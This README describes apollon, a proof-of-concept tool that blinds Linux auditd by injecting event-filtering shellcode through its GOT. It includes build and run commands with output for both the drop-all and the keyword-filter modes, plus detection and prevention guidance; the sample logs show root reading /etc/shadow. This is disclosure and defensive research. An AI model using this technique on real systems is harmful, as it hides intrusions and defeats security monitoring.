### apollon

----

*apollon* is a proof of concept tool for blindsiding *auditd*. It works
by patching the *global offset table* (*GOT*) of *auditd* via `/proc/pid/mem`
and replacing the pointer to a *libc* function with a pointer to event
filtering shellcode.

For patching *auditd* memory, root privileges are required. This method
of tampering with *auditd* events have proven to be very stealthy. Monitoring
`/proc` using *auditd* is not that easy and no suspicious events have been
observed when running *apollon* against some popular *auditd* rule sets.

More technical details as well as detection and prevention guidance can be
found within our blog post [blindsiding auditd for fun and profit](https://code-white.com/blog/2023-08-blindsiding-auditd-for-fun-and-profit/).


### Usage

----

Since *apollon* is only a proof of concept, the supported functionalities
are limited. *apollon* ships two different shellcodes that can be
injected into *auditd*. The first one - [filter-all.asm](src/filter-all.asm) -
filters all incoming events and completely blindsides *auditd*. With this
payload, the only required argument is the *PID* of the *auditd* process:

```console
[root@auditd apollon]$ make apollon-all-x64
gcc -c src/procmem.c -o procmem.o -O3 -I include -w -ldl
gcc -c src/utils.c -o utils.o -O3 -I include -w -ldl
nasm src/filter-all.asm -o shellcode-all.bin -f bin
python3 generate-header.py shellcode-all.bin
gcc -D FILTER_ALL -c src/apollon.c -o apollon-all-x64.o -O3 -I include -w -ldl
gcc procmem.o utils.o apollon-all-x64.o -o dist/apollon-all-x64 -O3 -I include -w -ldl
strip --strip-unneeded dist/apollon-all-x64

[root@auditd apollon]$ ./dist/apollon-all-x64 427
[+] Found data segment of 427 at 0x7482dd37d000
[+] Found libc base address of 427 at 0x7482dd04d000
[+] Found offset of 'recvfrom' in libc at e7cc0
[+] Searching for pattern 0x7482dd134cc0 in data segment of 427
[+] Data segment is 2000 bytes long.
[+] Found 'recvfrom' in 427 at 0x7482dd37dea0
[+] Preparing shellcode...
[+] Replaced 1 occurences of recvfrom.
[+] Searching codecave for 23 byte shellcode...
[+] Found code cave in 427 at 0x62bddc2bfaf1
[+] Wrtiting shellcode to codecave.
[+] Replacing 'recvfrom' GOT entry with shellcode addr.
[+] auditd patched successfully.
```

Afterwards, no more events should be logged by *auditd*. The second shellcode -
[filter-selective.asm](/src/filter-selective.asm) - filters events based on a
keyword. With this payload, a second argument is expected that will be used as
a filter for *auditd* events. Each event containing the pattern will be dropped:

```console
[root@auditd apollon]$ make apollon-selective-x64
gcc -c src/procmem.c -o procmem.o -O3 -I include -w -ldl
gcc -c src/utils.c -o utils.o -O3 -I include -w -ldl
nasm src/filter-selective.asm -o shellcode-selective.bin -f bin
python3 generate-header.py shellcode-selective.bin
gcc -c src/apollon.c -o apollon-selective-x64.o -O3 -I include -w -ldl
gcc procmem.o utils.o apollon-selective-x64.o -o dist/apollon-selective-x64 -O3 -I include -w -ldl
strip --strip-unneeded dist/apollon-selective-x64

[root@auditd apollon]$ ./dist/apollon-selective-x64 427 pid=1337
[+] Found data segment of 427 at 0x72e3428a4000
[+] Found libc base address of 427 at 0x72e342574000
[+] Found offset of 'recvfrom' in libc at e7cc0
[+] Searching for pattern 0x72e34265bcc0 in data segment of 427
[+] Data segment is 2000 bytes long.
[+] Found 'recvfrom' in 427 at 0x72e3428a4ea0
[+] Preparing shellcode...
[+] Replaced 2 occurences of recvfrom.
[+] Found strstr in 427 at 0x72e342600a30
[+] Replaced 1 occurences of strstr.
[+] Found strtoul in 427 at 0x72e34259a9c0
[+] Replaced 2 occurences of strtoul.
[+] Found code cave for pattern matching in 427 at 0x5fec525332ad
[+] Wrtiting 'pid=1337' to codecave.
[+] Replaced 1 occurences of matcher pattern.
[+] Searching codecave for 264 byte shellcode...
[+] Found code cave in 427 at 0x5fec5254baf1
[+] Wrtiting shellcode to codecave.
[+] Replacing 'recvfrom' GOT entry with shellcode addr.
[+] auditd patched successfully.
```

After the above patch, all events containing `pid=1337` will be dropped. Since
*auditd* events usually consist out of multiple audit messages, each audit message
sharing the same event ID as the initially filtered message is also dropped. 


### Detection

----

A detailed technical discussion of *apollon* and some possible detection methods
are discussed within our blog post [blindsiding auditd for fun and profit](https://code-white.com/blog/2023-08-blindsiding-auditd-for-fun-and-profit/).
In this README, we only provide an overview of possible detection methods:

1. Dynamically created *auditd* rules can be used to monitor `/proc/pid/mem` of critical processes.
  The following listing shows how this can be achieved for *auditd* by applying an adjustment to the
  *auditd unit file*:

  ```systemd
  [Service]
  Type=forking
  PIDFile=/run/auditd.pid
  ExecStart=/sbin/auditd
  ExecStartPost=-/sbin/augenrules --load
  # The following line monitors write access to /proc/pid/mem of auditd
  ExecStartPost=/bin/bash -c "auditctl -w /proc/$(cat /run/auditd.pid)/mem -p wa -k process-injection"
  ```

2. Monitor the *auditd* daemon for error messages. Simply clearing the netlink output
  buffer as done by *apollon* causes error messages as shown below:

  ```
  Jul 31 13:25:02 auditd auditd[427]: Netlink message from kernel was not OK
  Jul 31 13:25:02 auditd auditd[427]: Netlink message from kernel was not OK
  Jul 31 13:25:02 auditd auditd[427]: Netlink message from kernel was not OK
  Jul 31 13:25:02 auditd auditd[427]: Netlink message from kernel was not OK
  ```

3. Look for missing event IDs in *auditd* logs. If certain event IDs are skipped, this
  may indicate tampering. The listing below shows an *auditd* log where one event was
  dropped by *apollon*:

  ```
  type=SYSCALL msg=audit(1690788664.304:980): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffe5e584772 a2=0 a3=0 items=1 ppid=1022 pid=1226 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=4294967295 comm="cat" exe="/usr/bin/cat" key="etcpasswd"ARCH=x86_64 SYSCALL=openat AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
  type=PATH msg=audit(1690788664.304:980): item=0 name="/etc/shadow" inode=270575 dev=ca:03 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
  type=PROCTITLE msg=audit(1690788664.304:980): proctitle=636174002F6574632F736861646F77
  type=SYSCALL msg=audit(1690788671.579:982): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffc22a71772 a2=0 a3=0 items=1 ppid=1022 pid=1228 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=4294967295 comm="cat" exe="/usr/bin/cat" key="etcpasswd"ARCH=x86_64 SYSCALL=openat AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
  type=PATH msg=audit(1690788671.579:982): item=0 name="/etc/shadow" inode=270575 dev=ca:03 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
  type=PROCTITLE msg=audit(1690788671.579:982): proctitle=636174002F6574632F736861646F77
  ```

4. If possible, restrict *ptrace* permissions e.g. by using a *Linux Security Module*.
  [Yama](https://www.kernel.org/doc/html/v4.15/admin-guide/LSM/Yama.html) represents
  one option to globally prevent access to `/proc/pid/mem` by configuring a restrictive
  `ptrace_scope`. If globally disabling *ptrace* is not an option, you may can prevent
  *ptrace* access to critical processes by writing a custom *Linux Security Module*.
